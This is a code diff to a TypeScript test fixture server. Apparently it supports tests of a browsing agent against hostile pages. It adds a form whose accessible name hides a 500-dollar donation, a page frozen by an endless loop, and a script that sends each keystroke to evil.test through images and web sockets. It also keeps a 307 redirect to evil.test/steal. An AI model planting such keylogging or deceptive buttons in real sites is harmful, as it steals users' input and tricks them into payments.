@@ -131,6 +131,38 @@ export async function startFixture(): Promise<Fixture> {
       case 'shop.test/pay-go':
         // a 307 keeps the method and the body, so a post goes on to the off-list host.
         return send(307, '', 'text/plain', { location: at('evil.test', '/steal') });
+      case 'shop.test/forms':
+        // the text of each button differs from its accessible name, and the first button is hidden from it.
+        return send(
+          200,
+          html(
+            `<form action="/order" method="post"><label>Note <input name="note" value="hello"></label>
+              <button type="submit" aria-hidden="true" style="opacity:0">Buy now</button></form>
+            <form action="/donate" method="post"><input type="hidden" name="amount" value="500">
+              <button type="submit" aria-label="Buy now">Donate 500 dollars</button></form>
+            <form action="/send" method="post"><label>Message <input name="msg" value="hi"></label>
+              <button aria-label="Send message">Send</button></form>`,
+            'Forms',
+          ),
+        );
+      case 'shop.test/send':
+        return send(200, html(`<h1>Message sent</h1><p>${body}</p>`, 'Sent'));
+      case 'shop.test/freeze':
+        // the page hangs a moment after the click, when no step runs.
+        return send(200, html('<button onclick="setTimeout(() => { for (;;) {} }, 500)">Freeze</button><p>calm</p>', 'Freeze'));
+      case 'shop.test/typed':
+        // a script sends each key to another site, with an image and a web socket. no form is sent.
+        return send(
+          200,
+          html(
+            `<label>Address <input id="a"></label>
+            <script>document.getElementById('a').addEventListener('input', (e) => {
+              new Image().src = '${at('evil.test', '/img')}?v=' + encodeURIComponent(e.target.value);
+              try { new WebSocket('${at('evil.test', '/ws').replace('http:', 'ws:')}?v=' + encodeURIComponent(e.target.value)); } catch {}
+            });</script>`,
+            'Typed',
+          ),
+        );
       case 'shop.test/about':
         return send(200, html('<h1>About the shop</h1><p>We sell shirts.</p>', 'About'));
       case 'shop.test/buy':
@@ -204,6 +236,11 @@ export async function startFixture(): Promise<Fixture> {
       default:
         return send(404, html('<h1>not found</h1>'));
     }
+  });
+  // a web socket handshake does not reach the request handler, so it is recorded here with the method UPGRADE.
+  server.on('upgrade', (req, socket) => {
+    fixture.hits.push({ host: (req.headers.host ?? '').split(':')[0]!, method: 'UPGRADE', path: req.url ?? '/', body: '', agent: req.headers['user-agent'] ?? '' });
+    socket.destroy();
   });
   await new Promise<void>((resolve) => server.listen(0, '127.0.0.1', resolve));
   port = (server.address() as { port: number }).port;
